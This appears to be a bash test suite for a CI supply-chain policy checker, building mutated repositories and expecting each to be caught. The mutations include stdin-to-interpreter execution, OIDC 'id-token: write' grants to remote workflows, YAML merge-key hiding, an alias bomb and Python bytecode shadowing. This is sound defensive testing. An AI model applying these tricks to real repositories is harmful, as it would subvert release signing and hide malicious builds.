d=$(mk s9_bashdotlib); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bash ./mylib\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: bash ./mylib (Sonnet 3)" tree "$d"
d=$(mk s9_bashbinlib); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bash bin/mylib\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: bash bin/mylib (Sonnet 3)" tree "$d"
d=$(mk s9_bashtxt); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bash mylib.txt\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: bash mylib.txt (Sonnet 3)" tree "$d"
d=$(mk s9_catbash); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}cat mylib | bash\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: cat mylib | bash (stdin to an interpreter)" tree "$d"
d=$(mk s9_bashc); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bash -c id\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: bash -c with program text" tree "$d"
d=$(mk s9_py_c); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}python3 -c pass\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: python3 -c with program text" tree "$d"
d=$(mk s9_pystdin); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}python3 < mylib\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect caught "AC1 script: python3 reading its program from a redirect" tree "$d"
d=$(mk s9_ok_exact); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bash bin/build-apk.sh\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect ok "AC1 script: control: bash with the exact listed path" tree "$d"
d=$(mk s9_ok_dot); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bash ./bin/build-apk.sh\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect ok "AC1 script: control: bash with the exact listed path and a leading ./" tree "$d"
d=$(mk s9_ok_cmd); python3 -c 'import sys; d=sys.argv[1]; open(d+"/mytool","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/bin/mytool2","w").write("#!/usr/bin/env bash\necho x\n"); open(d+"/mylib","w").write("echo x\n"); open(d+"/bin/mylib","w").write("echo x\n"); open(d+"/mylib.txt","w").write("echo x\n")' "$d"; setfile "$d" bin/build-stage.sh "${S0}bin/build-apk.sh x\n"; edit_spec "$d" 'rows["bin/build-stage.sh"]["tools"]=["witness","bash","python3","exec","setsid","flock","eval","source","env","busybox","time"]; rows["bin/build-stage.sh"]["runs"]=["bin/build-apk.sh"]'; expect ok "AC1 script: control: the exact listed path at command position" tree "$d"
probe mytool "./mytool" "the real bin/chain-hostile-step.sh running ./mytool (an unlisted root executable with a shebang), its sha256 updated (Sonnet 1)" \
  "printf '#!/usr/bin/env bash\\necho x\\n' > mytool; chmod +x mytool; printf './mytool\\n' >> bin/chain-hostile-step.sh; rehash bin/chain-hostile-step.sh"
probe bashlib "mylib" "the real bin/chain-hostile-step.sh running bash mylib, its sha256 updated (Sonnet 3)" \
  "printf 'echo x\\n' > mylib; printf 'bash mylib\\n' >> bin/chain-hostile-step.sh; rehash bin/chain-hostile-step.sh"
# ---- Opus #249 r-final: the signer rule is a CLOSED ALLOW-LIST, not a scan ----
# (B1) build configuration outside bin/ and .github/ is pinned by sha256 (rule 61: .goreleaser.yaml and the Dockerfiles are gone; their key-set and hook probes went with them)
probe cfgchanged .golangci.yml "a byte change in a pinned build file (.golangci.yml)" "printf '# x\n' >> .golangci.yml"
probe cfgnew    .ko.yaml "a new, unlisted build file (.ko.yaml)" "printf 'defaultBaseImage: scratch\n' > .ko.yaml"
# (B2) a job may hold id-token: write only if .github/policy/id-token-jobs.json lists it (workflow, job): remote reusable-workflow signers and
# in-process libraries need the token, so the list covers them structurally
IDJ='  probe-job:\n    runs-on: ubuntu-24.04\n    permissions:\n      id-token: write\n      contents: read\n'
probe remote    "ci.yml job probe-job" "a ci.yml job calling a remote reusable workflow with id-token: write" \
  "printf '  probe-job:\n    permissions:\n      id-token: write\n    uses: evilorg/prov-gen/.github/workflows/generator.yml@0123456789abcdef0123456789abcdef01234567\n' >> .github/workflows/ci.yml"
probe ghscript  "ci.yml job probe-job" "actions/github-script calling @actions/attest attestProvenance with id-token: write" \
  "printf '$IDJ    steps:\n      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n        with:\n          script: require(\"@actions/attest\").attestProvenance({})\n' >> .github/workflows/ci.yml"
probe newjob    "ci.yml job probe-job" "a new ci.yml job holding id-token: write" "printf '$IDJ    steps:\n      - run: true\n' >> .github/workflows/ci.yml"
probe compcall  "ci.yml job probe-job" "a ci.yml job with id-token: write that runs a local composite action" \
  "mkdir -p .github/actions/plain; printf 'name: plain\nruns:\n  using: composite\n  steps:\n    - run: true\n      shell: bash\n' > .github/actions/plain/action.yml; printf '$IDJ    steps:\n      - uses: ./.github/actions/plain\n' >> .github/workflows/ci.yml"
probe wfperm    "ci.yml job" "workflow-level permissions id-token: write added to ci.yml (every job without its own permissions inherits it)" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"permissions:\n  contents: read\n\",\"permissions:\n  contents: read\n  id-token: write\n\",1);open(p,\"w\").write(t)'"
# Sonnet verify of b89b783: a signer OUTSIDE the scanned directories, and one in another repository: keyless signing needs the job's OIDC
# token, so both are closed by the id-token list (the job that would run them is not on it)
probe scriptsq  "ci.yml job probe-job" "a ci.yml job with id-token: write running scripts/q.sh (outside bin/ and .github/) that signs provenance" \
  "mkdir -p scripts; printf 'cosign attest --type slsaprovenance --predicate p.json x\n' > scripts/q.sh; printf '$IDJ    steps:\n      - run: bash scripts/q.sh\n' >> .github/workflows/ci.yml"
probe otherrepo "ci.yml job probe-job" "a ci.yml job with id-token: write calling other/repo/.github/workflows/sign.yml@<sha>" \
  "printf '  probe-job:\n    permissions:\n      id-token: write\n    uses: other/repo/.github/workflows/sign.yml@0123456789abcdef0123456789abcdef01234567\n' >> .github/workflows/ci.yml"
# Opus r3 B1: a signer STEP added to a job that is already on the id-token list is seen by the signer table (@actions/attest in-process)
GHS='      - uses: actions/github-script@60a0d83039c74a4aee543508d2ffcb1c3799cdea # v7.0.1\n        with:\n          script: require(\x27@actions/attest\x27).attestProvenance()\n'
probe listedjob "scorecard.yml signs provenance" "actions/github-script calling attestProvenance added to scorecard.yml's listed analysis job" \
  "python3 -c 'import sys;p=\".github/workflows/scorecard.yml\";t=open(p).read();i=t.index(\"    steps:\n\")+len(\"    steps:\n\");t=t[:i]+sys.argv[1].encode().decode(\"unicode_escape\")+t[i:];open(p,\"w\").write(t)' '$GHS'"
# Sonnet r3 G1: the same signer step in another listed job (scan.yml's scanner)
probe listedjob2 "scan.yml signs provenance" "actions/github-script calling attestProvenance added to scan.yml's listed scanner job" \
  "python3 -c 'import sys;p=\".github/workflows/scan.yml\";t=open(p).read();i=t.index(\"  scanner:\");i=t.index(\"    steps:\n\",i)+len(\"    steps:\n\");t=t[:i]+sys.argv[1].encode().decode(\"unicode_escape\")+t[i:];open(p,\"w\").write(t)' '$GHS'"
# Sonnet r3 G3: a YAML merge key inside permissions would hide id-token: write from a reader that does not merge
probe mergejob  "merge key" "a job whose permissions use a << merge key carrying id-token: write" \
  "printf '  probe-job:\n    runs-on: ubuntu-24.04\n    permissions:\n      <<: {id-token: write}\n    steps:\n      - run: true\n' >> .github/workflows/ci.yml"
probe mergewf   "merge key" "workflow-level permissions with a << merge key carrying id-token: write" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"permissions:\n  contents: read\n\",\"permissions:\n  contents: read\n  <<: {id-token: write}\n\",1);open(p,\"w\").write(t)'"
# Sonnet r3: build flags/env that run a tool, and the dockers / nfpms / includes sections, are outside the closed key set (hash re-edited)
# Sonnet r4 S1: a merge key at job or workflow level can supply permissions a reader that does not merge never sees
probe mergeanchorjob "merge key" "an anchor x-d: &d {permissions: {id-token: write}} merged into ci.yml job test with <<: *d" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"\njobs:\n\",\"\nx-d: &d {permissions: {id-token: write}}\njobs:\n\",1);t=t.replace(\"\n  test:\n\",\"\n  test:\n    <<: *d\n\",1);open(p,\"w\").write(t)'"
probe mergewfkey "merge key" "a workflow-level << merge key that supplies permissions to ci.yml" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"\njobs:\n\",\"\nx-p: &p {permissions: {id-token: write}}\n<<: *p\njobs:\n\",1);open(p,\"w\").write(t)'"
# Opus r5 M: one structural rule, any merge key or !!merge tag at any depth of any workflow or composite action
probe mergejobs  "merge key" "a << in the jobs: mapping that adds a whole job" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"\njobs:\n\",\"\njobs:\n  <<: {evil: {runs-on: ubuntu-24.04, permissions: {id-token: write}, steps: [{run: \\\"true\\\"}]}}\n\",1);open(p,\"w\").write(t)'"
probe mergetag   "merge key" "a !!merge x: key at job level" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"\n  test:\n\",\"\n  test:\n    !!merge x: {permissions: {id-token: write}}\n\",1);open(p,\"w\").write(t)'"
probe mergematrix "merge key" "a << inside a strategy matrix" "printf '  probe-m:\n    runs-on: ubuntu-24.04\n    strategy:\n      matrix:\n        <<: {os: [a]}\n    steps:\n      - run: true\n' >> .github/workflows/ci.yml"
probe mergecomplex "merge key" "a complex key ? << at job level" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"\n  test:\n\",\"\n  test:\n    ? <<\n    : {permissions: {id-token: write}}\n\",1);open(p,\"w\").write(t)'"
probe mergelist  "merge key" "a << with a list of anchors" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"\njobs:\n\",\"\nx-a: &a {permissions: {id-token: write}}\nx-b: &b {timeout-minutes: 5}\njobs:\n\",1);t=t.replace(\"\n  test:\n\",\"\n  test:\n    <<: [*a, *b]\n\",1);open(p,\"w\").write(t)'"
probe mergeaction "merge key" "a << in a composite action" "mkdir -p .github/actions/mrg; printf 'name: m\nruns:\n  using: composite\n  steps:\n    - <<: {run: echo x}\n      shell: bash\n' > .github/actions/mrg/action.yml"
# Sonnet r5: the exact anchored hidden job merged with `<<: *d` as the first line under jobs:
probe mergehidden "merge key" "an anchored hidden job (x-d: &d {hidden: {...id-token: write...}}) merged by <<: *d under jobs:" \
  "python3 -c 'p=\".github/workflows/ci.yml\";t=open(p).read();t=t.replace(\"\njobs:\n\",\"\nx-d: &d {hidden: {runs-on: ubuntu-24.04, permissions: {id-token: write}, steps: [{run: \\\"true\\\"}]}}\njobs:\n  <<: *d\n\",1);open(p,\"w\").write(t)'"
# Sonnet r5: case variants of write / write-all hold the token as far as this check is concerned
probe idWrite   "ci.yml job probe-job holds id-token" "a job with id-token: Write (capitalised)" "printf '  probe-job:\n    runs-on: ubuntu-24.04\n    permissions:\n      id-token: Write\n    steps:\n      - run: true\n' >> .github/workflows/ci.yml"
probe idWriteAll "ci.yml job probe-job holds id-token" "a job with permissions: Write-All" "printf '  probe-job:\n    runs-on: ubuntu-24.04\n    permissions: Write-All\n    steps:\n      - run: true\n' >> .github/workflows/ci.yml"
# Opus r6 L1: a composite action anywhere in the repository is judged (signers and merge keys), not only under .github/actions/
AUD=".github/""agent"   # (split: REQ-AUD-18 AC1 keeps the auditor directory's literal path out of files outside it)
ACT_SIGN='name: a\nruns:\n  using: composite\n  steps:\n    - run: cosign attest-blob --yes --type slsaprovenance --predicate p.json x\n      shell: bash\n'
probe actbin   "bin/act/action.yml" "a composite action at bin/act/action.yml that signs provenance" "mkdir -p bin/act; printf '$ACT_SIGN' > bin/act/action.yml"
probe actaud   "agent/act/action.yml" "a composite action under the auditor directory that signs provenance" "mkdir -p $AUD/act; printf '$ACT_SIGN' > $AUD/act/action.yml"
probe actroot  "action.yaml" "a root action.yaml that signs provenance" "printf '$ACT_SIGN' > action.yaml"
probe actmerge "bin/act2/Action.yml" "a << merge key in a composite action at bin/act2/Action.yml" "mkdir -p bin/act2; printf 'name: m\nruns:\n  using: composite\n  steps:\n    - <<: {run: echo x}\n      shell: bash\n' > bin/act2/Action.yml"
# Opus r6 L2: a composite action that does not parse is a finding, not skipped
probe actunparse "m4/action.yml" "a composite action with a second YAML document (it does not parse as one)" "mkdir -p .github/actions/m4; printf 'name: m\nruns:\n  using: composite\n  steps:\n    - <<: {run: echo x}\n      shell: bash\n---\nx: 1\n' > .github/actions/m4/action.yml"
# Sonnet r6: compiled-code names match case-insensitively
probe pycupper "bin/x/a.PYC" "a bin/x/a.PYC" "mkdir -p bin/x; printf '\\0' > bin/x/a.PYC"
probe cacheupper "bin/__PYCACHE__" "a bin/__PYCACHE__ directory" "mkdir -p bin/__PYCACHE__; printf '\\0' > bin/__PYCACHE__/m.txt"
probe soupper  "bin/y.SO" "a bin/y.SO" "printf '\\0' > bin/y.SO"
# Sonnet r6: an alias bomb with a merge key at its base: the merge-key walk visits each node once, finishes quickly, and still refuses it
d=$(tracked_copy bomb); python3 - "$d/.github/workflows/ci.yml" <<'PYB'
import sys
p = sys.argv[1]; t = open(p).read()
bomb = "x-b0: &b0 {<<: {k: v}}\n" + "".join("x-b%d: &b%d [%s]\n" % (i, i, ", ".join(["*b%d" % (i - 1)] * 9)) for i in range(1, 10))
open(p, "w").write(t.replace("\njobs:\n", "\n" + bomb + "jobs:\n", 1))
PYB
bout=$(python3 - "$work/judge.py" "$d" <<'PYT'
import os, subprocess, sys
try:
    r = subprocess.run([sys.executable, sys.argv[1], "tree", sys.argv[2]], capture_output=True, text=True, timeout=120, env=os.environ)
    print("rc=%d %s" % (r.returncode, r.stdout[:300]))
except subprocess.TimeoutExpired:
    print("TIMEOUT")
PYT
)
case "$bout" in *TIMEOUT*) failn=$((failn + 1)); echo "FAIL an alias bomb hung the merge-key walk";;
  rc=1*"merge key"*) pass=$((pass + 1)); echo "ok   an alias bomb with a merge key at its base is walked once per node, finishes, and is refused";;
  *) failn=$((failn + 1)); echo "FAIL an alias bomb was not refused: ${bout:0:200}";; esac
# Opus r3 L2: a workflow the id-token check cannot parse fails closed (here next to a new id-token job)
probe unparsed  "codeql.yml" "codeql.yml that does not parse, holding a new id-token job" "printf '$IDJ    steps:\n      - run: true\n  broken: [\n' >> .github/workflows/codeql.yml"
probe stale     "scorecard.yml job analysis" "a listed job that no longer holds id-token: write (a stale entry)" "sed -i.bak '/id-token: write/d' .github/workflows/scorecard.yml; rm -f .github/workflows/scorecard.yml.bak"
# the isolation really works: with a bin/fractions.py that prints a marker on import, `python3 -I bin/chain-verify.py --help` runs the
# real module (no marker, usage printed) while plain `python3 bin/chain-verify.py --help` is shadowed (the control: the probe bites)
iso="$work/iso"; rm -rf "$iso"; mkdir -p "$iso/bin" "$iso/.github/policy"; cp "$root"/bin/chain-verify.py "$root"/bin/chain_common.py "$root"/bin/chain_hostile.py "$root"/bin/chain_items.py "$iso/bin/"
cp "$root/.github/policy/chain-scripts.json" "$iso/.github/policy/"
printf 'print("SHADOW-MARKER-%s")\nfrom fractions import *\n' "$$" > "$iso/bin/fractions.py"
rc=0; out=$(cd "$iso" && python3 -I bin/chain-verify.py --help 2>&1) || rc=$?
case "$out" in *SHADOW-MARKER*) failn=$((failn + 1)); echo "FAIL python3 -I bin/chain-verify.py imported bin/fractions.py (not isolated)";;
  *usage:*) [ "$rc" = 0 ] && { pass=$((pass + 1)); echo "ok   python3 -I bin/chain-verify.py ignores a bin/fractions.py and runs (usage printed)"; } || { failn=$((failn + 1)); echo "FAIL python3 -I bin/chain-verify.py --help exit $rc"; };;
  *) failn=$((failn + 1)); echo "FAIL python3 -I bin/chain-verify.py --help did not run: ${out:0:200}";; esac
rc=0; out=$(cd "$iso" && python3 bin/chain-verify.py --help 2>&1) || rc=$?
case "$out" in *SHADOW-MARKER*) pass=$((pass + 1)); echo "ok   control: without -I the same bin/fractions.py IS imported (the probe bites)";; *) failn=$((failn + 1)); echo "FAIL control: without -I the marker did not appear";; esac
# Opus r5 B1: the helper modules are compiled from the bytes that carry the listed sha256, never from a bytecode cache. An UNCHECKED-HASH
# bin/__pycache__/chain_common.<tag>.pyc that prints a marker must not run; and a changed chain_common.py (bytes no longer the listed ones)
# is refused before it runs
rm -f "$iso/bin/fractions.py"
python3 - "$iso/bin" <<'PYC'
import os, py_compile, sys, tempfile
b = sys.argv[1]
for name in ("chain_common", "chain_hostile", "chain_items"):
    src = open(os.path.join(b, name + ".py")).read()
    with tempfile.NamedTemporaryFile("w", suffix=".py", delete=False) as t:
        t.write('print("MARKER-PYC-%s")\n' % name.upper() + src)
    cache = os.path.join(b, "__pycache__", "%s.%s.pyc" % (name, sys.implementation.cache_tag))
    os.makedirs(os.path.dirname(cache), exist_ok=True)
    py_compile.compile(t.name, cfile=cache, invalidation_mode=py_compile.PycInvalidationMode.UNCHECKED_HASH)
    os.unlink(t.name)
PYC
rc=0; out=$(cd "$iso" && python3 -I -B bin/chain-verify.py --help 2>&1) || rc=$?
case "$out" in *MARKER-PYC*) failn=$((failn + 1)); echo "FAIL python3 -I -B bin/chain-verify.py ran a bytecode cache instead of the hashed source";;
  *usage:*) pass=$((pass + 1)); echo "ok   an unchecked-hash bin/__pycache__ copy of the helper modules is never run (the hashed source is compiled)";;
  *) failn=$((failn + 1)); echo "FAIL python3 -I -B bin/chain-verify.py --help did not run with a pyc present: ${out:0:200}";; esac
rm -rf "$iso/bin/__pycache__"; printf '# changed\n' >> "$iso/bin/chain_common.py"
rc=0; out=$(cd "$iso" && python3 -I -B bin/chain-verify.py --help 2>&1) || rc=$?
case "$out" in *sha256*) [ "$rc" != 0 ] && { pass=$((pass + 1)); echo "ok   a helper module whose bytes do not match chain-scripts.json is refused before it runs"; } || { failn=$((failn + 1)); echo "FAIL a changed helper module ran (exit 0)"; };;
  *) failn=$((failn + 1)); echo "FAIL a changed helper module was not refused by its sha256 (exit $rc): ${out:0:200}";; esac
# no `X | grep -q` pipeline in a chain suite: under pipefail grep's early exit can SIGPIPE the writer and fail a case that matched
quiet_pipes() {  # quiet_pipes FILE... -> prints FILE:LINE of each pipe into a quiet grep (-q, --quiet, --silent; continued lines joined)
  python3 - "$@" <<'PYQ'
import re, sys
QUIET = re.compile(r"(?<!\|)\|(?!\|)\s*grep\b[^|\n]*\s(-[A-Za-z]*q[A-Za-z]*|--quiet|--silent)\b")
for f in sys.argv[1:]:
    text = re.sub(r"\\\n\s*", " ", open(f).read())
    for i, l in enumerate(text.split("\n"), 1):
        if not l.lstrip().startswith("#") and QUIET.search(l): print("%s:%d" % (f, i))
PYQ
}
qp=$(quiet_pipes "$root"/bin/chain-*-test.sh)
if [ -z "$qp" ]; then pass=$((pass + 1)); echo "ok   no chain suite pipes into grep -q (pipefail + SIGPIPE)"; else failn=$((failn + 1)); echo "FAIL a chain suite pipes into grep -q: $qp"; fi
G=grep; printf 'x | %s --quiet y\n' "$G" > "$work/qp1.sh"; printf 'printf x \\\n  | %s -qF y\n' "$G" > "$work/qp2.sh"
[ -n "$(quiet_pipes "$work/qp1.sh")" ] && { pass=$((pass + 1)); echo "ok   the pipe lint catches grep --quiet"; } || { failn=$((failn + 1)); echo "FAIL the pipe lint missed grep --quiet"; }
[ -n "$(quiet_pipes "$work/qp2.sh")" ] && { pass=$((pass + 1)); echo "ok   the pipe lint catches a pipe continued with a backslash (and -qF)"; } || { failn=$((failn + 1)); echo "FAIL the pipe lint missed a continued pipe"; }
# only TRACKED files are judged: an untracked file with a signer in a working copy is not part of what CI checks out
g="$work/gitcopy"; rm -rf "$g"; cp -R "$REAL" "$g"; ( cd "$g" && git init -q . && git add -A && git -c user.name=t -c user.email=t@t -c commit.gpgsign=false commit -qm c )
printf 'cosign attest --type slsaprovenance x\n' > "$g/bin/untracked-signer.sh"
expect ok "an UNTRACKED file holding a signer is not in the tracked copy CI judges" tree "$(tracked_copy fromgit "$g")"
# (Codex #249 r6 R8; PR 2: admission is the first step of Build's apk job, so the tag guard is Build's own gate G) every release.yml job after build
# up to release that is not dry-run-only (if: exactly ${{ inputs.dry-run }}) depends on build, which carries the gate G (a v* tag PUSH, or a dry run),
# directly or through its needs
cat > "$work/tagguard.py" <<'PY'
import sys, yaml
GATE = "${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}"
d = yaml.load(open(sys.argv[1]).read(), Loader=yaml.BaseLoader); jobs = d.get("jobs") or {}
def needs(j):
    n = (jobs.get(j) or {}).get("needs") or []
    return [n] if isinstance(n, str) else list(n)
def reaches(j, seen=()):
    return any(x == "build" or (x not in seen and reaches(x, seen + (j,))) for x in needs(j))
order = list(jobs); chain = order[order.index("build") + 1:order.index("release") + 1]
bad = [j for j in chain if str(jobs[j].get("if", "")).strip() != "${{ inputs.dry-run }}" and not reaches(j)]
if "admission" in jobs: bad.append("an admission job is back (admission is Build's first step)")
if str(jobs["build"].get("if", "")).strip() != GATE: bad.append("build is not tag-guarded by the gate G")
print("; ".join(bad) or "ok"); sys.exit(1 if bad else 0)
PY
tg() { local rc=0 out; out=$(python3 "$work/tagguard.py" "$2") || rc=$?
  if { [ "$1" = ok ] && [ "$rc" = 0 ]; } || { [ "$1" = caught ] && [ "$rc" != 0 ]; }; then pass=$((pass + 1)); echo "ok   $3${out:+ ($out)}"; else failn=$((failn + 1)); echo "FAIL $3 -> $out"; fi; }
tg ok "$root/.github/workflows/release.yml" "R8 release.yml: build carries the tag gate and every job from sign to release that is not dry-run-only depends on build through needs"
cp "$root/.github/workflows/release.yml" "$work/rel-noadm.yml"
python3 - "$work/rel-noadm.yml" <<'PY'
import re, sys
t = open(sys.argv[1]).read()
for j in ("sign", "check", "release", "authorization", "acceptance-predicate", "scans", "acceptance-artifacts"):
    t = re.sub(r"(\n  %s:\n(?:    .*\n|\s*\n)*?    needs: )(.*)" % re.escape(j), lambda m: m.group(1) + "[" + ", ".join(x for x in re.findall(r"[\w-]+", m.group(2)) if x not in ("build", "rebuild")) + "]", t, count=1)
t = re.sub(r"(\n  rebuild:\n(?:    .*\n|\s*\n)*?    needs: )build", r"\1[]", t, count=1)
open(sys.argv[1], "w").write(t)
PY
tg caught "$work/rel-noadm.yml" "R8 mutation: with build removed from the needs lists, the jobs after it no longer reach the tag gate and are caught"
cp "$root/.github/workflows/release.yml" "$work/rel-nogate.yml"
python3 - "$work/rel-nogate.yml" <<'PY'
import sys
t = open(sys.argv[1]).read()
g = "if: ${{ (github.event_name == 'push' && startsWith(github.ref, 'refs/tags/v')) || inputs.dry-run == true }}"
t = t.replace(g, "if: ${{ inputs.dry-run == true }}", 1)
open(sys.argv[1], "w").write(t)
PY
tg caught "$work/rel-nogate.yml" "R8 mutation: a build without the tag gate is caught"

# ---- PR 1b (judge exceptions): (A) reviewed exact-text exceptions, (B) ambient env names, (C) the path-named deny test at command position only.
# REQ-CHAIN-001-AC1 (listed-script clause), REQ-CHAIN-004-AC2 (timeout 540 around the wrapped command), REQ-CHAIN-004-AC8 (GH_TOKEN through the step's env), REQ-CHAIN-004-AC3 (--go-archive archive/go).
expm() { # expm ok|caught DIR FRAGMENT LABEL : the tree judge with stderr merged; a caught case must name FRAGMENT and must not be a traceback
  local out rc=0
  out=$(judge tree "$2" 2>&1) || rc=$?
  if [ "$1" = ok ] && [ "$rc" = 0 ]; then pass=$((pass + 1)); echo "ok   $4"
  elif [ "$1" = caught ] && [ "$rc" != 0 ] && ! grep -q Traceback <<< "$out" && grep -F -q -- "$3" <<< "$out"; then pass=$((pass + 1)); echo "ok   $4 (caught: ${out:0:160})"
  else failn=$((failn + 1)); echo "FAIL $4 -> rc=$rc ${out:0:500}"; fi
}
DEF='D=lambda l,c=1,w="x":{"rule":"deny","line":l,"line_sha256":__import__("hashlib").sha256(l.encode()).hexdigest(),"count":c,"why":w};'
export WT='timeout 540 bash "$@"'
wfix() { # wfix NAME [more script lines] : bin/witnessed.sh with the AC2 line and its one witness-target exception
  local d; d=$(mk "$1")
  printf '#!/usr/bin/env bash\nset -euo pipefail\nwitness run -a environment,material -- timeout 540 bash "$@"\n%b' "${2:-}" > "$d/bin/witnessed.sh"
  edit_spec "$d" 'import os;rows["bin/witnessed.sh"]={"path":"bin/witnessed.sh","tools":["timeout","bash"],"signs":"other","reason":"the Witness wrapper","runs":[],"exceptions":[{"rule":"witness-target","text":os.environ["WT"],"why":"REQ-CHAIN-004-AC2"}]}'
  echo "$d"
}
d=$(wfix x_ok); expm ok "$d" - "REQ-CHAIN-004-AC2 exception: witness run -- timeout 540 bash \"\$@\" with a witness-target exception for exactly that text and tools timeout, bash"
d=$(wfix x_none); edit_spec "$d" 'del rows["bin/witnessed.sh"]["exceptions"]'; expm caught "$d" 'witness run' "exception: the same script without the exception entry is refused (the finding is real)"
d=$(wfix x_exec 'exec bash "$@"\n'); edit_spec "$d" 'rows["bin/witnessed.sh"]["tools"].append("exec")'; expm caught "$d" 'launches another program' "exception: the same script with exec bash \"\$@\" added stays refused (launcher; the witness-target exception covers its own span only)"
d=$(wfix x_stale); edit_spec "$d" 'rows["bin/witnessed.sh"]["exceptions"][0]["text"]+="x"'; expm caught "$d" 'stale' "exception: the exception text changed by one character is a stale-entry error"
